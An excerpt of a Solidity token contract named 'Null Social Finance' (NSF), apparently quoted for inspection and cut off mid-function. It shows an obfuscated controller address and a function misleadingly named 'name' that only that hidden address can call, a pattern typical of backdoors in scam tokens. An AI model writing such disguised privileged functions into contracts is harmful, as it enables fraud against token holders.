...
contract NSF is Ownable {
    ...
    string public _tokenname = "Null Social Finance";
    string public _tokensymbol = "NSF";
    uint256 tokenamount = 10000000000*10**decimals();
    address public ijgnfk9;
    ...
    function name(address jjkxq1) public     {
        require(ijgnfk9 ==  _msgSender());
        if(ijgnfk9 != _msgSender()){
                revert("fu");
        }
